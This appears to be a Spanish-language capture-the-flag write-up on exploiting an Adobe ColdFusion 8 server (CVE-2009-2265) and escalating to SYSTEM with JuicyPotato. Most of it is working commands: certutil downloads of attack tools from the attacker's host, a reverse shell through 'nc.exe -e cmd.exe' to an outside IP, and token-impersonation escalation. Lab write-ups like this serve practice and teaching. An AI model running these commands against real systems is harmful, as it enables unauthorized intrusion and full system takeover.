# Enumeración

<img width="931" height="715" alt="image" src="https://github.com/user-attachments/assets/a6d21e45-6e12-48b2-9ffd-a2f50d5313d8" />

https://github.com/0xDTC/Adobe-ColdFusion-8-RCE-CVE-2009-2265/tree/master
<img width="605" height="198" alt="image" src="https://github.com/user-attachments/assets/99b44f42-b065-405d-905c-e9104700fcf2" />


ESCALADA:
````
# requisito: whoami /priv -> SeImpersonatePrivilege = Enabled. Windows VIEJO (2008/2008R2/2012)
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"   # confirmar version/build (build < 17763)

# --- KALI: baja JuicyPotato + nc de 32 bits y sírvelos por HTTP (puerto 80) ---
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -O JuicyPotato.exe
wget https://github.com/int0x33/nc.exe/raw/master/nc.exe -O nc.exe     # nc 32-bit (la shell IIS/w3wp es 32-bit)
python3 -m http.server 80                              # sirve AMBOS desde esta carpeta

# --- VICTIMA: carpeta corta (evita que la shell cutre trunque el comando) y descarga ---
mkdir C:\t
certutil -urlcache -f http://10.10.14.65/JuicyPotato.exe C:\t\jp.exe
certutil -urlcache -f http://10.10.14.65/nc.exe C:\t\nc.exe
dir C:\t\jp.exe                                        # verifica tamaño (~340KB; si 1KB = era 404)

# --- reverse metida en un .bat (deja el comando de jp corto, no se trunca) ---
echo C:\t\nc.exe -e cmd.exe 10.10.14.65 5555 > C:\t\s.bat

# 1) CONFIRMAR (jp NO muestra salida: vuelca a fichero y lee con type):
C:\t\jp.exe -l 5555 -p cmd.exe -a "/c type C:\Users\Administrator\Desktop\root.txt > C:\t\r.txt" -t *
type C:\t\r.txt                                        # -> el flag de root

# 2) SHELL interactiva de SYSTEM:
#   KALI (listener ANTES de disparar): nc -lnvp 5555
C:\t\jp.exe -l 5555 -p cmd.exe -a "/c C:\t\s.bat" -t *
````
<img width="539" height="182" alt="image" src="https://github.com/user-attachments/assets/48c5d588-ede2-4437-b4b5-840f9c70b3e4" />
